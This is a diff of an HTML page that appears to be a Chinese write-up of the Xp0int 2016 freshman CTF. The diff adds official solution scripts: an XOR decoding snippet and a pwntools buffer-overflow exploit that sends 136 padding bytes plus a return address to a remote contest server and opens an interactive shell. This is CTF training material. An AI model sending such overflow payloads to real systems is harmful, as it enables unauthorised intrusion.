@@ -112,7 +112,7 @@
 <meta property="og:description" content="为了招揽安全方向的新生，暨南大学Xp0int团队组织了Xp0int2016新生杯交流赛。
 由于是民间团队，题目较基础，校内外大牛就不用来战了。
 本文总结了这次比赛题目的Write up，详细请查看全文。">
-<meta property="og:updated_time" content="2016-10-27T14:21:04.676Z">
+<meta property="og:updated_time" content="2016-10-31T14:46:20.031Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Xp0int新生杯交流赛Write up">
 <meta name="twitter:description" content="为了招揽安全方向的新生，暨南大学Xp0int团队组织了Xp0int2016新生杯交流赛。
@@ -551,13 +551,15 @@
 <p>flag 666666 0123</p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/1b5968c7b7019cac21744fa13f96fc90/1.txt" target="_blank" rel="external">1.txt</a></p>
 </blockquote>
+<p>官方脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">#str1=&quot;fmcd]v7ag~TxwPi!gaKw\&quot;dl8g&quot;</div><div class="line">str1=&apos;fmcd]v7ag~TxwPi!gaKw&quot;dl8g&apos;</div><div class="line">str2=&apos;&apos;</div><div class="line">for x in xrange(len(str1)):</div><div class="line">    str2+=chr(ord(str1[x])^x)</div><div class="line"></div><div class="line">print str2</div></pre></td></tr></table></figure>
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><blockquote>
 <p>直接下载看看吧</p>
 <p>nc 119.29.191.200 10100</p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/5bca2d0024f8e640440a07702761e291/pwn150" target="_blank" rel="external">pwn150</a></p>
 </blockquote>
+<p>官方脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn100")</span></div><div class="line">p = remote(<span class="string">"119.29.191.200"</span>, <span class="string">"10100"</span>)</div><div class="line">ret = <span class="number">0x4005E4</span></div><div class="line">payload = <span class="string">"A"</span> *<span class="number">136</span> + p64(ret)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>我也不知道是什么</p>
 <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="请输入flag"><a href="#请输入flag" class="headerlink" title="请输入flag"></a>请输入flag</h2><blockquote>
 <p>Hit：尝试使用IDA，进行逆向，工具下载 请戳–&gt;<a href="http://down.52pojie.cn/Tools/Disassemblers/" target="_blank" rel="external">http://down.52pojie.cn/Tools/Disassemblers/</a></p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/bb61c803306fca6b3688eb00644689ed/re100.zip" target="_blank" rel="external">re100.zip</a></p>
